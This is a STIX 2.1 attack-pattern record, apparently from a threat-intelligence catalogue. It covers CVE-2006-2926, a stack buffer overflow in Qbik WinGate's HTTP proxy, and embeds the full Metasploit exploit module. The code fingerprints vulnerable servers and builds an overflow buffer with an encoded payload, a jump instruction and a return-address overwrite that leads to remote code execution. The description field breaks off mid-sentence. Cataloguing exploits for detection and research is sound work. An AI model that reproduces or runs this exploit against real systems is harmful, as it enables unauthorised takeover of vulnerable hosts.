{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--538d0d1e-68fa-4279-988d-131918e47d13",
    "created": "2024-08-14T16:56:40.692718Z",
    "modified": "2024-08-14T16:56:40.692722Z",
    "name": "Qbik WinGate WWW Proxy Server URL Processing Overflow",
    "description": " This module exploits a stack buffer overflow in Qbik WinGate version",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/proxy/qbik_wingate_wwwproxy.rb",
            "external_id": "qbik_wingate_wwwproxy.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2926"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Qbik WinGate WWW Proxy Server URL Processing Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Qbik WinGate version\n        6.1.1.1077 and earlier. By sending malformed HTTP POST URL to the\n        HTTP proxy service on port 80, a remote attacker could overflow\n        a buffer and execute arbitrary code.\n      },\n      'Author'         => 'aushack',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-2926' ],\n          [ 'OSVDB', '26214' ],\n          [ 'BID', '18312' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20+&=%\\/\\\\\\#;\\\"\\':<>?\",\n          'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'WinGate 6.1.1.1077', { 'Ret' => 0x01991932 } ], # call esi\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2006-06-07',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"GET /\\r\\n\\r\\n\") # Malformed request to get proxy info\n    banner = sock.get_once || ''\n    if (banner =~ /Server:\\sWinGate\\s6.1.1\\s\\(Build 1077\\)/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    buff = Rex::Text.rand_text_alphanumeric(3000)\n    buff[1200, 1000] = payload.encoded # jmp here\n    buff[2200, 5] = Rex::Arch::X86.jmp(-1005) # esi\n    buff[2284, 4] = [target['Ret']].pack('V') #eip\n\n    sploit  = \"POST http://#{buff}/ HTTP/1.0\\r\\n\\r\\n\"\n\n    sock.put(sploit)\n    sock.get_once(-1, 3)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_contributors": [
        "aushack",
        ""
    ],
    "x_mitre_disclosure_date": "2006-06-07",
    "x_mitre_platforms": [
        "win'"
    ]
}